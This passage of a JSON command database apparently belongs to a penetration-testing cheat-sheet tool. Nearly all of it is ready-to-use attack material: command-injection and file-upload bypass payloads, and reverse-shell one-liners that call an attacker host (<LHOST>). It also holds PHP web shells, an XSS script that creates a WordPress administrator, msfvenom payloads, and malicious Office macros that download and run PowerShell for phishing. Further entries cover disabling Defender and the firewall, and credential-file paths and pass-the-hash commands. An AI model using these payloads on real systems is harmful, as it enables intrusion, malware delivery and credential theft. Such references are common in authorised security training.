                  "curl \"http://<TARGET>/index.php?page=http://<LHOST>/simple-backdoor.php&cmd=ls\""
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "exploit-21",
        "name": "Command Injection",
        "description": "OS command injection operators, CMD/PS detection, and reverse shell delivery via powercat.",
        "commands": [
          {
            "desc": "Injection Operators",
            "entries": [
              {
                "subdesc": "Try each operator — behavior differs: ; always runs, && only on success, || only on failure, | pipes output",
                "cmd": [
                  "; id",
                  "| id",
                  "$(id)",
                  "`id`",
                  "&& id",
                  "|| id",
                  "> /tmp/output",
                  "< /etc/passwd"
                ]
              }
            ]
          },
          {
            "desc": "curl POST Test",
            "entries": [
              {
                "subdesc": "URL-encode the operator (%3B = ;) when injecting through HTTP parameters",
                "cmd": [
                  "curl -X POST --data 'param=value%3Bid' http://<TARGET>:<PORT>/endpoint"
                ]
              }
            ]
          },
          {
            "desc": "CMD vs PowerShell Detect",
            "entries": [
              {
                "subdesc": "Determine which shell environment handles injection — affects payload choice",
                "cmd": [
                  "(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell"
                ]
              }
            ]
          },
          {
            "desc": "Reverse Shell via Injection",
            "entries": [
              {
                "subdesc": "Deliver powercat and catch shell",
                "cmd": [
                  "cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .",
                  "python3 -m http.server 80",
                  "nc -lvnp <LPORT>"
                ]
              },
              {
                "subdesc": "Inject",
                "cmd": [
                  "IEX (New-Object System.Net.Webclient).DownloadString(\"http://<LHOST>/powercat.ps1\");powercat -c <LHOST> -p <LPORT> -e powershell"
                ]
              }
            ]
          },
          {
            "desc": "Bypass Spaces",
            "entries": [
              {
                "subdesc": "Replace spaces with URL encoding or IFS variable to evade input filters",
                "cmd": [
                  "%20",
                  "${IFS}"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "exploit-22",
        "name": "File Upload Bypass",
        "description": "Extension bypasses, null bytes, .htaccess override, RTLO trick, special chars, and directory traversal upload.",
        "commands": [
          {
            "desc": "Alt Extensions",
            "entries": [
              {
                "subdesc": "Try each PHP-equivalent extension. Also try UPPERCASE variants",
                "cmd": [
                  ".phps .php7 .phtml .pht .phar {UPPERCASE}"
                ]
              }
            ]
          },
          {
            "desc": "Null Byte / Double Extension",
            "entries": [
              {
                "subdesc": "Null byte terminates the string; double extension may confuse validation logic",
                "cmd": [
                  "file.php%00.jpg",
                  "file.jpg.php"
                ]
              }
            ]
          },
          {
            "desc": "NTFS / Special Char Tricks",
            "entries": [
              {
                "subdesc": "Server may strip trailing chars but validation checks full name",
                "cmd": [
                  "file.php......    # trailing dots",
                  "file.php%20       # trailing space",
                  "file.php%0d%0a.jpg  # CRLF injection",
                  "file.php%0a        # newline",
                  "file.php/          # trailing slash",
                  "file.php.\\        # trailing backslash",
                  "file.php/./././.   # multiple special chars"
                ]
              }
            ]
          },
          {
            "desc": ".htaccess Override",
            "entries": [
              {
                "subdesc": "Upload .htaccess first to make Apache treat custom extensions as PHP",
                "cmd": [
                  "echo \"AddType application/x-httpd-php .dork\" > .htaccess"
                ]
              },
              {
                "subdesc": "Upload shell as shell.dork",
                "cmd": [
                  "# Upload your PHP shell renamed to shell.dork — Apache will execute it as PHP"
                ]
              }
            ]
          },
          {
            "desc": "RTLO Trick",
            "entries": [
              {
                "subdesc": "Right-To-Left Override character reverses displayed text",
                "cmd": [
                  "name.%E2%80%AEphp.jpg > name.gpj.php"
                ]
              }
            ]
          },
          {
            "desc": "SSH Key via Dir Traversal",
            "entries": [
              {
                "subdesc": "Upload your id_rsa.pub content with path traversal in filename",
                "cmd": [
                  "# filename: ../../../../root/.ssh/authorized_keys"
                ]
              }
            ]
          },
          {
            "desc": "Find Webroot",
            "entries": [
              {
                "subdesc": "If webroot path is unknown, brute force common directories to find where uploads land",
                "cmd": [
                  "gobuster dir -u http://<TARGET> -w /usr/share/wordlists/dirb/common.txt -x php,txt"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "exploit-xss",
        "name": "Cross-Site Scripting (XSS)",
        "description": "Reflected, stored, and DOM-based XSS testing with WAF bypass techniques.",
        "commands": [
          {
            "desc": "Test Characters",
            "entries": [
              {
                "subdesc": "Inject these in input fields and check if they render unescaped in the response",
                "cmd": [
                  "< > ' \" { } ;"
                ]
              }
            ]
          },
          {
            "desc": "Reflected XSS",
            "entries": [
              {
                "subdesc": "Try multiple HTML elements — <img> and <svg> bypass basic <script> filters",
                "cmd": [
                  "<script>alert('XSS')</script>",
                  "<img src=x onerror=alert('XSS')>",
                  "<svg onload=alert('XSS')>"
                ]
              }
            ]
          },
          {
            "desc": "Stored XSS – Privilege Escalation",
            "entries": [
              {
                "subdesc": "Inject JS to create admin user (e.g., WordPress)",
                "cmd": [
                  "<script>var ajaxRequest=new XMLHttpRequest();var url=\"/wp-admin/user-new.php\";var usr=\"hacker\";var passwd=\"hacker123\";ajaxRequest.open(\"POST\",url,true);ajaxRequest.send(\"action=createuser&_wpnonce_create-user=\"+nonce+\"&user_login=\"+usr+\"&email=hacker@hacker.com&pass1=\"+passwd+\"&pass1-text=\"+passwd+\"&pass2=\"+passwd+\"&role=administrator\");</script>"
                ]
              }
            ]
          },
          {
            "desc": "WAF Bypass & Encoding",
            "entries": [
              {
                "subdesc": "Use charCodeAt + fromCharCode or base64 to encode payloads",
                "cmd": [
                  "curl -i http://<TARGET> --data-urlencode \"param=<script>alert(1)</script>\""
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "exploit-revshells",
        "name": "Reverse Shells",
        "description": "Common reverse shell one-liners for Linux (bash, Python, netcat) and Windows (PowerShell, powercat, Nishang).",
        "commands": [
          {
            "desc": "Bash",
            "entries": [
              {
                "subdesc": "Most reliable Linux reverse shell — works on most systems with /dev/tcp support",
                "cmd": [
                  "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"
                ]
              }
            ]
          },
          {
            "desc": "Python",
            "entries": [
              {
                "subdesc": "Works on any system with Python installed — check python vs python3",
                "cmd": [
                  "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"<LHOST>\",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
                ]
              }
            ]
          },
          {
            "desc": "Netcat (traditional)",
            "entries": [
              {
                "subdesc": "First form needs nc with -e flag. Second (mkfifo) works on all netcat versions",
                "cmd": [
                  "nc -e /bin/bash <LHOST> <LPORT>",
                  "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f"
                ]
              }
            ]
          },
          {
            "desc": "PHP",
            "entries": [
              {
                "subdesc": "Useful when PHP CLI is available — common on web servers",
                "cmd": [
                  "php -r '$sock=fsockopen(\"<LHOST>\",<LPORT>);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
                ]
              }
            ]
          },
          {
            "desc": "PowerShell (powercat)",
            "entries": [
              {
                "subdesc": "Download powercat to target, then execute reverse shell",
                "cmd": [
                  "IEX (New-Object System.Net.Webclient).DownloadString('http://<LHOST>/powercat.ps1');powercat -c <LHOST> -p <LPORT> -e powershell"
                ]
              }
            ]
          },
          {
            "desc": "PowerShell (IWR)",
            "entries": [
              {
                "subdesc": "Download and execute a PS reverse shell script from attacker",
                "cmd": [
                  "powershell -c 'IEX(IWR http://<LHOST>:<LPORT>/revshell.ps1 -UseBasicParsing)'"
                ]
              }
            ]
          },
          {
            "desc": "Nishang Invoke-PowerShellTcp",
            "entries": [
              {
                "subdesc": "Add to end of Invoke-PowerShellTcp.ps1",
                "cmd": [
                  "Invoke-PowerShellTcp -Reverse -IPAddress <LHOST> -Port <LPORT>"
                ]
              },
              {
                "subdesc": "Then host and trigger download+exec on target",
                "cmd": [
                  "# Host the modified .ps1 file on your HTTP server and trigger IEX download on target"
                ]
              }
            ]
          },
          {
            "desc": "Listener",
            "entries": [
              {
                "subdesc": "Start listener BEFORE triggering the reverse shell on the target",
                "cmd": [
                  "nc -lvnp <LPORT>"
                ]
              }
            ]
          },
          {
            "desc": "Shell Upgrade (Linux)",
            "entries": [
              {
                "subdesc": "Spawn PTY shell",
                "cmd": [
                  "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
                ]
              },
              {
                "subdesc": "Ctrl+Z, then stabilize",
                "cmd": [
                  "stty raw -echo; fg",
                  "export TERM=xterm"
                ]
              }
            ]
          },
          {
            "desc": "WinPEAS Tip",
            "entries": [
              {
                "subdesc": "Run WinPEAS with cmd.exe not PowerShell. Enable colored output with VirtualTerminalLevel",
                "cmd": [
                  "REG ADD HKCU\\Console /v VirtualTerminalLevel /t REG_DWORD /d 1",
                  "cmd.exe /c winpeas.exe"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "exploit-webshells",
        "name": "Web Shells",
        "description": "PHP webshell one-liners, MySQL OUTFILE shells, and Kali built-in webshells.",
        "commands": [
          {
            "desc": "PHP One-Liners",
            "entries": [
              {
                "subdesc": "Upload via file upload vuln, LFI log poisoning, or SQL injection. Access: ?cmd=whoami",
                "cmd": [
                  "<?php echo system($_GET['cmd']); ?>",
                  "<?php echo exec($_GET['cmd']); ?>",
                  "<?php echo passthru($_GET['cmd']); ?>"
                ]
              }
            ]
          },
          {
            "desc": "Minimal",
            "entries": [
              {
                "subdesc": "Shortest possible webshell — uses REQUEST (GET or POST). Access: ?c=id",
                "cmd": [
                  "<?php system($_REQUEST['c']); ?>"
                ]
              }
            ]
          },
          {
            "desc": "MySQL INTO OUTFILE Webshell",
            "entries": [
              {
                "subdesc": "Requires FILE privilege and writable web directory. Adjust path for target OS",
                "cmd": [
                  "SELECT \"<?php if(isset($_GET['cmd'])) { system($_GET['cmd'] . ' 2>&1'); } ?>\" INTO OUTFILE \"C:/wamp/www/webshell.php\";"
                ]
              }
            ]
          },
          {
            "desc": "Kali Webshells",
            "entries": [
              {
                "subdesc": "Pre-installed webshells in Kali — PHP, ASP, JSP, CFM variants available",
                "cmd": [
                  "/usr/share/webshells/php/"
                ]
              }
            ]
          },
          {
            "desc": "Alternative PHP Webshell",
            "entries": [
              {
                "subdesc": "Includes stderr redirect (2>&1) for better error output visibility",
                "cmd": [
                  "<?php if(isset($_GET['cmd'])) { system($_GET['cmd'] . ' 2>&1'); } ?>"
                ]
              }
            ]
          },
          {
            "desc": "Alternative PHP Webshell (REQUEST)",
            "entries": [
              {
                "subdesc": "REQUEST accepts both GET and POST — more flexible than GET-only shells",
                "cmd": [
                  "<?php if (isset($_REQUEST['cmd'])) {system($_REQUEST['cmd']);} ?>"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "exploit-msf",
        "name": "Metasploit / msfvenom",
        "description": "Metasploit framework setup, msfvenom payload generation (Windows/Linux), and multi/handler listener.",
        "commands": [
          {
            "desc": "Initialize Metasploit DB",
            "entries": [
              {
                "subdesc": "Required before using database features (hosts, services, creds tracking)",
                "cmd": [
                  "sudo msfdb init",
                  "msfconsole"
                ]
              }
            ]
          },
          {
            "desc": "Workspaces",
            "entries": [
              {
                "subdesc": "Isolate data per engagement — each workspace has its own hosts, services, and loot",
                "cmd": [
                  "workspace -a <NAME>",
                  "workspace <NAME>",
                  "workspace -d <NAME>"
                ]
              }
            ]
          },
          {
            "desc": "Auxiliary Modules",
            "entries": [
              {
                "subdesc": "Scanners, fuzzers, and enumeration modules — use 'search' to find relevant ones",
                "cmd": [
                  "search type:auxiliary <SERVICE>",
                  "use auxiliary/scanner/<MODULE>",
                  "set RHOSTS <TARGET_IP>",
                  "run"
                ]
              }
            ]
          },
          {
            "desc": "Meterpreter Basics",
            "entries": [
              {
                "subdesc": "Interactive post-exploitation shell. Use 'background' to return to msf console without killing session",
                "cmd": [
                  "sysinfo",
                  "getuid",
                  "shell",
                  "background",
                  "sessions -l",
                  "sessions -i <ID>"
                ]
              }
            ]
          },
          {
            "desc": "msfvenom: Windows x86 Staged (.exe)",
            "entries": [
              {
                "subdesc": "Staged payloads (/) are smaller but require a handler. Use for size-constrained scenarios",
                "cmd": [
                  "msfvenom -p windows/shell/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell_staged.exe"
                ]
              }
            ]
          },
          {
            "desc": "msfvenom: Windows x86 Stageless (.exe)",
            "entries": [
              {
                "subdesc": "Stageless payloads (_) are self-contained — more reliable but larger",
                "cmd": [
                  "msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe"
                ]
              }
            ]
          },
          {
            "desc": "msfvenom: Windows x64 Staged (.exe)",
            "entries": [
              {
                "subdesc": "Use x64 payloads for modern 64-bit Windows targets",
                "cmd": [
                  "msfvenom -p windows/x64/shell/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell64_staged.exe"
                ]
              }
            ]
          },
          {
            "desc": "msfvenom: Windows x64 Stageless (.exe)",
            "entries": [
              {
                "subdesc": "Self-contained — no handler needed for initial execution, more reliable",
                "cmd": [
                  "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell64.exe"
                ]
              }
            ]
          },
          {
            "desc": "msfvenom: Windows Shellcode (C / PowerShell)",
            "entries": [
              {
                "subdesc": "Raw shellcode for embedding in custom loaders",
                "cmd": [
                  "msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f c",
                  "msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f psh-cmd"
                ]
              }
            ]
          },
          {
            "desc": "msfvenom: Windows Other Formats",
            "entries": [
              {
                "subdesc": "ASP for IIS, DLL for DLL hijacking, HTA for browser delivery, PS1 for PowerShell",
                "cmd": [
                  "msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f asp -o shell.asp",
                  "msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o shell.dll",
                  "msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f hta-psh -o shell.hta",
                  "msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f psh -o shell.ps1"
                ]
              }
            ]
          },
          {
            "desc": "msfvenom: Linux x64 ELF",
            "entries": [
              {
                "subdesc": "Standard Linux payload — chmod +x before executing on target",
                "cmd": [
                  "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell.elf"
                ]
              }
            ]
          },
          {
            "desc": "msfvenom: Linux x64 Stageless ELF",
            "entries": [
              {
                "subdesc": "Self-contained Linux payload — no handler dependency on initial connect",
                "cmd": [
                  "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell_stageless.elf"
                ]
              }
            ]
          },
          {
            "desc": "msfvenom: Linux Shellcode (C)",
            "entries": [
              {
                "subdesc": "Raw C shellcode for embedding in custom Linux exploits or loaders",
                "cmd": [
                  "msfvenom -p linux/x86/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f c"
                ]
              }
            ]
          },
          {
            "desc": "msfvenom: Format Options",
            "entries": [
              {
                "subdesc": "Common output formats: exe, elf, dll, asp, jsp, war, py, ps1, psh, psh-cmd, hta-psh, c, raw, hex",
                "cmd": [
                  "msfvenom --list formats"
                ]
              }
            ]
          },
          {
            "desc": "Multi/Handler Listener",
            "entries": [
              {
                "subdesc": "Must match the payload used in msfvenom. Use staged handler for staged payloads",
                "cmd": [
                  "use exploit/multi/handler",
                  "set payload windows/x64/shell_reverse_tcp",
                  "set LHOST <LHOST>",
                  "set LPORT <LPORT>",
                  "run"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "exploit-shellcode",
        "name": "Shellcode Execution (Windows)",
        "description": "Generate shellcode with msfvenom and execute via PowerShell Reflection using Windows API (VirtualAlloc, CreateThread).",
        "commands": [
          {
            "desc": "Generate Shellcode",
            "entries": [
              {
                "subdesc": "Output in PowerShell format for direct use in the runner script below",
                "cmd": [
                  "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f powershell"
                ]
              }
            ]
          },
          {
            "desc": "PowerShell Shellcode Runner",
            "entries": [
              {
                "subdesc": "Uses VirtualAlloc, CreateThread, and WaitForSingleObject via C# interop. Replace SHELLCODE_PLACEHOLDER with msfvenom output",
                "cmd": [
                  "# Key Windows API flow:",
                  "# 1. VirtualAlloc - allocate RWX memory (0x3000 = reserve+commit, 0x40 = exec_readwrite)",
                  "# 2. Marshal.Copy - copy shellcode bytes into allocated memory",
                  "# 3. CreateThread - execute shellcode from memory address",
                  "# 4. WaitForSingleObject - wait for shellcode to complete",
                  "",
                  "# Full script: define C# classes with DllImport for kernel32 functions,",
                  "# Add-Type them, store shellcode in $buf, allocate+copy+execute"
                ]
              }
            ]
          },
          {
            "desc": "Key Concepts",
            "entries": [
              {
                "subdesc": "PowerShell Reflection enables calling Windows API at runtime without compiled binaries — stealthier than dropping .exe files",
                "cmd": [
                  "# VirtualAlloc: allocates memory in process address space",
                  "# CreateThread: creates new thread to execute shellcode",
                  "# WaitForSingleObject: pauses until shellcode thread completes"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "exploit-macros",
        "name": "Malicious Macros",
        "description": "Word/LibreOffice VBA macros for PowerShell download-and-execute payloads.",
        "commands": [
          {
            "desc": "Word VBA Macro (AutoOpen)",
            "entries": [
              {
                "subdesc": "Triggers when document is opened. Use Document_Open as backup — some versions prefer it",
                "cmd": [
                  "Sub AutoOpen()",
                  "  CreateObject(\"Wscript.Shell\").Run \"cmd /c powershell -ep bypass -nop IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1')\"",
                  "End Sub"
                ]
              }
            ]
          },
          {
            "desc": "Word VBA Macro (Document_Open)",
            "entries": [
              {
                "subdesc": "Alternative trigger — use if AutoOpen doesn't fire. Both can be included for reliability",
                "cmd": [
                  "Sub Document_Open()",
                  "  CreateObject(\"Wscript.Shell\").Run \"cmd /c powershell -ep bypass -nop IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1')\"",
                  "End Sub"
                ]
              }
            ]
          },
          {
            "desc": "NTLMv2 Capture via Macro",
            "entries": [
              {
                "subdesc": "Macro payload",
                "cmd": [
                  "Sub AutoOpen()",
                  "  CreateObject(\"Wscript.Shell\").Run \"cmd /c dir \\\\<LHOST>\\share\"",
                  "End Sub"
                ]
              },
              {
                "subdesc": "On attacker",
                "cmd": [
                  "sudo responder -I tun0"
                ]
              }
            ]
          },
          {
            "desc": "LibreOffice Macro",
            "entries": [
              {
                "subdesc": "Tools → Macros → Organize → Basic → assign macro to Open Document event",
                "cmd": [
                  "Sub Main",
                  "  Shell(\"cmd /c powershell -ep bypass -nop IWR -uri http://<LHOST>/shell.ps1 -OutFile C:\\Windows\\Temp\\shell.ps1; C:\\Windows\\Temp\\shell.ps1\")",
                  "End Sub"
                ]
              }
            ]
          },
          {
            "desc": "macro-generator.py",
            "entries": [
              {
                "subdesc": "Generates AutoOpen/Document_Open VBA stagers. Supports .doc VBA-EXE method, IWR cradle, and LibreOffice ODT",
                "cmd": [
                  "python3 macro-generator.py <LHOST> <LPORT>"
                ]
              }
            ]
          },
          {
            "desc": "Delivery",
            "entries": [
              {
                "subdesc": "Embed in .doc/.docm, send via phishing. .docx does NOT support macros",
                "cmd": [
                  ""
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "exploit-av-evasion",
        "name": "AV Evasion",
        "description": "msfvenom encoding, Shellter, Veil, Donut, PS obfuscation, UPX packing, nmap evasion, and Defender bypass.",
        "commands": [
          {
            "desc": "msfvenom Custom Encoding",
            "entries": [
              {
                "subdesc": "Encode payload multiple iterations to evade signature detection",
                "cmd": [
                  "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e x86/shikata_ga_nai -i 5 -f exe -o encoded_payload.exe"
                ]
              }
            ]
          },
          {
            "desc": "msfvenom Shellcode Output (C format)",
            "entries": [
              {
                "subdesc": "Generate raw shellcode for embedding in custom loaders or scripts",
                "cmd": [
                  "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f c"
                ]
              }
            ]
          },
          {
            "desc": "Shellter",
            "entries": [
              {
                "subdesc": "Run in wine on Kali. Auto mode > PE target (legit .exe) > L for listed payloads or C for custom",
                "cmd": [
                  "shellter"
                ]
              }
            ]
          },
          {
            "desc": "Veil Framework",
            "entries": [
              {
                "subdesc": "use 1 > list > use <payload_number> > set LHOST/LPORT > generate",
                "cmd": [
                  "veil"
                ]
              }
            ]
          },
          {
            "desc": "Donut (.NET/PE to shellcode)",
            "entries": [
              {
                "subdesc": "Convert .NET assemblies and PE files to position-independent shellcode",
                "cmd": [
                  "donut -i payload.exe -o payload.bin"
                ]
              }
            ]
          },
          {
            "desc": "PowerShell Obfuscation",
            "entries": [
              {
                "subdesc": "Install: Install-Module -Name Invoke-Obfuscation. Obfuscates PS scripts to evade AV/AMSI",
                "cmd": [
                  "Invoke-Obfuscation"
                ]
              }
            ]
          },
          {
            "desc": "PowerShell Base64 One-Liner",
            "entries": [
              {
                "subdesc": "Encode a PS command to base64 and run with -enc to bypass simple string detections",
                "cmd": [
                  "echo -n '<powershell-command>' | iconv -f ASCII -t UTF-16LE | base64 | tr -d '\\n'",
                  "powershell.exe -nop -exec bypass -enc <ENCODED-OUTPUT>"
                ]
              }
            ]
          },
          {
            "desc": "XOR / Hex Encoded Shells",
            "entries": [
              {
                "subdesc": "Custom encoding to bypass AV — decode at runtime in your loader",
                "cmd": [
                  "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f hex"
                ]
              }
            ]
          },
          {
            "desc": "UPX Packing",
            "entries": [
              {
                "subdesc": "Strip symbols first, then pack with UPX to reduce size and change binary signature",
                "cmd": [
                  "strip payload.exe",
                  "upx --best --ultra-brute payload.exe"
                ]
              }
            ]
          },
          {
            "desc": "Manual Compilation",
            "entries": [
              {
                "subdesc": "Compile custom C payloads directly to avoid known tool signatures",
                "cmd": [
                  "gcc payload.c -o payload.exe"
                ]
              }
            ]
          },
          {
            "desc": "Nmap Evasion",
            "entries": [
              {
                "subdesc": "Evade IDS/firewall during scanning",
                "cmd": [
                  "nmap -f <TARGET>                    # fragmented packets",
                  "nmap -iR 10 <TARGET>                # randomize host order",
                  "nmap --spoof-mac Dell <TARGET>      # spoof MAC vendor"
                ]
              }
            ]
          },
          {
            "desc": "windows: Disable Defender",
            "entries": [
              {
                "subdesc": "Disable real-time protection to allow payload execution",
                "cmd": [
                  "Set-MpPreference -DisableRealtimeMonitoring $true"
                ]
              }
            ]
          },
          {
            "desc": "windows: Disable Firewall",
            "entries": [
              {
                "subdesc": "Turn off Windows Firewall on all profiles to enable C2 traffic",
                "cmd": [
                  "netsh advfirewall set allprofiles state off",
                  "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"
                ]
              }
            ]
          },
          {
            "desc": "windows: Disable RDP (cover tracks)",
            "entries": [
              {
                "subdesc": "Stop Terminal Services to prevent admin RDP access during engagement",
                "cmd": [
                  "Stop-Service TermService -Force"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "exploit-git",
        "name": "Git Repositories",
        "description": "Dump exposed .git dirs, scan for secrets with gitleaks/trufflehog, and review commit history.",
        "commands": [
          {
            "desc": "Dump Exposed .git",
            "entries": [
              {
                "subdesc": "Download the .git directory from web servers. git-dumper: pip install git-dumper",
                "cmd": [
                  "wget -r http://<TARGET>/.git/",
                  "git-dumper http://<TARGET>/.git/ <LOCAL-DIR>"
                ]
              }
            ]
          },
          {
            "desc": "Scan for Secrets",
            "entries": [
              {
                "subdesc": "Install: go install github.com/zricethezav/gitleaks/v8@latest | trufflehog: go install github.com/trufflesecurity/trufflehog/v3@latest",
                "cmd": [
                  "gitleaks dir -v",
                  "trufflehog filesystem <LOCAL-DIR>"
                ]
              }
            ]
          },
          {
            "desc": "Review History",
            "entries": [
              {
                "subdesc": "Walk through commit history looking for credentials, config changes, and removed secrets",
                "cmd": [
                  "git log --oneline",
                  "git show <COMMIT>",
                  "git diff <COMMIT1> <COMMIT2>"
                ]
              }
            ]
          },
          {
            "desc": "Search for Sensitive Data",
            "entries": [
              {
                "subdesc": "Search all commits for keywords like password, secret, key, token — Git keeps deleted content in history",
                "cmd": [
                  "git log -p --all -S 'password'",
                  "git log -p --all -S 'secret'"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "exploit-winconf",
        "name": "Windows: Configuration Files",
        "description": "SAM/SYSTEM, Unattend.xml, web.config, PS history, WiFi creds, and registry autologon.",
        "commands": [
          {
            "desc": "SAM/SYSTEM (local hashes)",
            "entries": [
              {
                "subdesc": "Copy both files and extract NTLM hashes offline with secretsdump.py LOCAL",
                "cmd": [
                  "C:\\Windows\\System32\\config\\SAM",
                  "C:\\Windows\\System32\\config\\SYSTEM"
                ]
              }
            ]
          },
          {
            "desc": "Unattend/Sysprep (cleartext creds)",
            "entries": [
              {
                "subdesc": "Often contain base64-encoded admin credentials from automated deployments",
                "cmd": [
                  "C:\\Windows\\Panther\\Unattend.xml",
                  "C:\\Windows\\Panther\\unattend\\Unattend.xml",
                  "C:\\Windows\\System32\\sysprep\\sysprep.xml"
                ]
              }
            ]
          },
          {
            "desc": "Web Configs",
            "entries": [
              {
                "subdesc": "May contain DB connection strings, API keys, and service account credentials",
                "cmd": [
                  "C:\\inetpub\\wwwroot\\web.config"
                ]
              }
            ]
          },
          {
            "desc": "PowerShell History",
            "entries": [
              {
                "subdesc": "Check all user profiles — often contains plaintext passwords passed as arguments",
                "cmd": [
                  "C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"
                ]
              }
            ]
          },
          {
            "desc": "WiFi Passwords",
            "entries": [
              {
                "subdesc": "Stored in cleartext — list profiles first with: netsh wlan show profiles",
                "cmd": [
                  "netsh wlan show profile <NAME> key=clear"
                ]
              }
            ]
          },
          {
            "desc": "Registry Autologon",
            "entries": [
              {
                "subdesc": "DefaultPassword stored in cleartext if autologon is configured",
                "cmd": [
                  "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\""
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "exploit-linconf",
        "name": "Linux: Configuration Files",
        "description": "Credentials, web configs, crontabs, SSH keys, service configs, and /proc leaks.",
        "commands": [
          {
            "desc": "User Credentials",
            "entries": [
              {
                "subdesc": "Check /etc/shadow for crackable hashes, bash_history for leaked passwords, and SSH keys for lateral movement",
                "cmd": [
                  "/etc/passwd",
                  "/etc/shadow",
                  "/home/<USER>/.bash_history",
                  "/home/<USER>/.ssh/id_rsa"
                ]
              }
            ]
          },
          {
            "desc": "Web Application Configs",
            "entries": [
              {
                "subdesc": "Database credentials, API keys, and secrets — check .env files first",
                "cmd": [
                  "/var/www/html/.env",
                  "/var/www/html/wp-config.php",
                  "/var/www/html/config.php"
                ]
              }
            ]
          },
          {
            "desc": "Service Configs",
            "entries": [
              {
                "subdesc": "Crontabs for privilege escalation paths, NFS exports for no_root_squash abuse",
                "cmd": [
                  "/etc/crontab",
                  "/etc/cron.d/*",
                  "/etc/exports",
                  "/etc/fstab"
                ]
              }
            ]
          },
          {
            "desc": "Proc Leaks",
            "entries": [
              {
                "subdesc": "Environment variables and command lines may expose credentials passed at runtime",
                "cmd": [
                  "/proc/self/environ",
                  "/proc/self/cmdline"
                ]
              }
            ]
          },
          {
            "desc": "SSH Configs",
            "entries": [
              {
                "subdesc": "Check PermitRootLogin, authorized_keys for persistence, and known_hosts for pivot targets",
                "cmd": [
                  "/etc/ssh/sshd_config",
                  "/root/.ssh/authorized_keys"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "exploit-hashcrack",
        "name": "Hash Cracking / Password Attacks",
        "description": "Hash identification, hashcat modes, and offline cracking techniques.",
        "commands": [
          {
            "desc": "Identify Hash Type",
            "entries": [
              {
                "subdesc": "The -m flag shows the corresponding hashcat mode number",
                "cmd": [
                  "hashid -m <HASH>"
                ]
              }
            ]
          },
          {
            "desc": "Hashcat Cracking",
            "entries": [
              {
                "subdesc": "Use -m to specify hash mode. Common: 0=MD5, 100=SHA1, 1000=NTLM, 1800=SHA-512, 3200=bcrypt, 5600=NTLMv2, 13100=Kerberoast",
                "cmd": [
                  "hashcat -m <MODE> <HASH-FILE> <WORDLIST>",
                  "hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt"
                ]
              }
            ]
          },
          {
            "desc": "John the Ripper",
            "entries": [
              {
                "subdesc": "Auto-detects hash format. Use --wordlist for dictionary attack",
                "cmd": [
                  "john --wordlist=/usr/share/wordlists/rockyou.txt <HASH-FILE>",
                  "john --show <HASH-FILE>"
                ]
              }
            ]
          },
          {
            "desc": "Pass The Hash",
            "entries": [
              {
                "subdesc": "NTLM hashes are not salted and remain static between sessions — no need to crack them",
                "cmd": [
                  "crackmapexec smb <SUBNET>/24 -u administrator -H 'NTHASH'",
                  "impacket-psexec <DOMAIN>/administrator@<TARGET_IP> -hashes 'LMHASH:NTHASH'",
                  "impacket-wmiexec <DOMAIN>/administrator@<TARGET_IP> -hashes 'LMHASH:NTHASH'"
                ]
              }
            ]
          },
          {
            "desc": "SMB PTH via smbclient",
            "entries": [
              {
                "subdesc": "Access shares using NTLM hash instead of password",
                "cmd": [
                  "smbclient //<TARGET_IP>/<SHARE> -U administrator --pw-nt-hash <NTHASH>"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "exploit-squid",
        "name": "SQUID Proxy",
